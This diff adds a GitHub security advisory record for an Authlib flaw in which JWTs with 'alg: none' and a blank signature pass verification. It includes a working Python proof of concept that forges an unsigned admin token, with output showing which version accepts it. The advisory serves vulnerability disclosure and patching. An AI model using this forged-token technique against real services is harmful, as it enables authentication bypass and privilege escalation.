@@ -1,0 +1,96 @@
+{
+  "ghsa_id": "GHSA-7wc2-qxgw-g8gg",
+  "cve_id": "CVE-2026-28802",
+  "url": "https://api.github.com/advisories/GHSA-7wc2-qxgw-g8gg",
+  "html_url": "https://github.com/advisories/GHSA-7wc2-qxgw-g8gg",
+  "summary": "Authlib: Setting `alg: none` and a blank signature appears to bypass signature verification",
+  "description": "### Summary\nAfter upgrading the library from 1.5.2 to 1.6.0 (and the latest 1.6.5) it was noticed that previous tests involving passing a malicious JWT containing alg: none and an empty signature was passing the signature verification step without any changes to the application code when a failure was expected. \n\n### Details\nIt was likely introduced in this commit:\nhttps://github.com/authlib/authlib/commit/a61c2acb807496e67f32051b5f1b1d5ccf8f0a75\n\n### PoC\n```\nfrom authlib.jose import jwt, JsonWebKey\nfrom cryptography.hazmat.primitives.asymmetric import rsa\nfrom cryptography.hazmat.primitives import serialization\nfrom cryptography.hazmat.backends import default_backend\nimport json\nimport base64\n\n\ndef create_jwks():\n    private_key = rsa.generate_private_key(\n        public_exponent=65537, key_size=2048, backend=default_backend()\n    )\n    public_pem = private_key.public_key().public_bytes(\n        encoding=serialization.Encoding.PEM,\n        format=serialization.PublicFormat.SubjectPublicKeyInfo,\n    )\n    jwk = JsonWebKey.import_key(public_pem).as_dict()\n    jwk[\"kid\"] = \"test-key-001\"\n    jwk[\"use\"] = \"sig\"\n    jwk[\"alg\"] = \"RS256\"\n    jwks = {\"keys\": [jwk]}\n    return jwks\n\n\ndef create_forged_token_with_alg_none():\n    forged_header = {\"alg\": \"none\"}\n    forged_payload = {\n        \"sub\": \"user123\",\n        \"role\": \"admin\",\n        \"iat\": 1735603200,\n    }\n\n    header_b64 = base64.urlsafe_b64encode(\n        json.dumps(forged_header).encode(\"utf-8\")\n    ).rstrip(b\"=\")\n\n    payload_b64 = base64.urlsafe_b64encode(\n        json.dumps(forged_payload).encode(\"utf-8\")\n    ).rstrip(b\"=\")\n\n    forged_token = header_b64 + b\".\" + payload_b64 + b\".\"\n    return forged_token\n\n\njwks = create_jwks()\nforged_token = create_forged_token_with_alg_none()\ntry:\n    claims = jwt.decode(forged_token, jwks)\n    print(f\"VULNERABLE: Forged token (alg:none) accepted: role={claims['role']}\")\nexcept Exception as e:\n    print(f\"SECURE: Token rejected - {type(e).__name__}\")\n```\n\nOutput:\n```\npip install -q authlib==1.5.2\npython3 authlib_alg_none_vulnerability.py \nSECURE: Token rejected - BadSignatureError\npip install -q authlib==1.6.5\npython3 authlib_alg_none_vulnerability.py \nVULNERABLE: Forged token (alg:none) accepted: role=admin\n```\n\n### Impact\nUsers of the library are likely not aware that they now need to check the provided headers and disallow `alg: none` usage, it is not obvious from the release notes that any action needs to be taken. As a best-practice, the library should adopt a 'secure by default' stance and default to rejecting it and allow the application to provide an algorithm whitelist.\n\nApplications using this library for authentication or authorization may accept malicious, forged JWTs, leading to:\n- Authentication bypass\n- Privilege escalation\n- Unauthorized access\n- Modification of application data",
+  "type": "reviewed",
+  "severity": "high",
+  "repository_advisory_url": "https://api.github.com/repos/authlib/authlib/security-advisories/GHSA-7wc2-qxgw-g8gg",
+  "source_code_location": "https://github.com/authlib/authlib",
+  "identifiers": [
+    {
+      "value": "GHSA-7wc2-qxgw-g8gg",
+      "type": "GHSA"
+    },
+    {
+      "value": "CVE-2026-28802",
+      "type": "CVE"
+    }
+  ],
+  "references": [
+    "https://github.com/authlib/authlib/security/advisories/GHSA-7wc2-qxgw-g8gg",
+    "https://github.com/authlib/authlib/commit/a61c2acb807496e67f32051b5f1b1d5ccf8f0a75",
+    "https://github.com/authlib/authlib/commit/b87c32ed07b8ae7f805873e1c9cafd1016761df7",
+    "https://nvd.nist.gov/vuln/detail/CVE-2026-28802",
+    "https://github.com/advisories/GHSA-7wc2-qxgw-g8gg"
+  ],
+  "published_at": "2026-03-04T20:55:47Z",
+  "updated_at": "2026-03-06T21:56:56Z",
+  "github_reviewed_at": "2026-03-04T20:55:47Z",
+  "nvd_published_at": "2026-03-06T07:16:01Z",
+  "withdrawn_at": null,
+  "vulnerabilities": [
+    {
+      "package": {
+        "ecosystem": "pip",
+        "name": "authlib"
+      },
+      "vulnerable_version_range": ">= 1.6.5, <= 1.6.6",
+      "first_patched_version": "1.6.7",
+      "vulnerable_functions": []
+    }
+  ],
+  "cvss_severities": {
+    "cvss_v3": {
+      "vector_string": null,
+      "score": 0.0
+    },
+    "cvss_v4": {
+      "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N/E:P",
+      "score": 7.7
+    }
+  },
+  "cwes": [
+    {
+      "cwe_id": "CWE-347",
+      "name": "Improper Verification of Cryptographic Signature"
+    }
+  ],
+  "credits": [
+    {
+      "user": {
+        "login": "michael-guignard",
+        "id": 97550243,
+        "node_id": "U_kgDOBdB_ow",
+        "avatar_url": "https://avatars.githubusercontent.com/u/97550243?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/michael-guignard",
+        "html_url": "https://github.com/michael-guignard",
+        "followers_url": "https://api.github.com/users/michael-guignard/followers",
+        "following_url": "https://api.github.com/users/michael-guignard/following{/other_user}",
+        "gists_url": "https://api.github.com/users/michael-guignard/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/michael-guignard/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/michael-guignard/subscriptions",
+        "organizations_url": "https://api.github.com/users/michael-guignard/orgs",
+        "repos_url": "https://api.github.com/users/michael-guignard/repos",
+        "events_url": "https://api.github.com/users/michael-guignard/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/michael-guignard/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "type": "reporter"
+    }
+  ],
+  "comments": 2,
+  "cvss": {
+    "vector_string": null,
+    "score": null
+  },
+  "epss": {
+    "percentage": 0.00569,
+    "percentile": 0.45155
+  }
+}
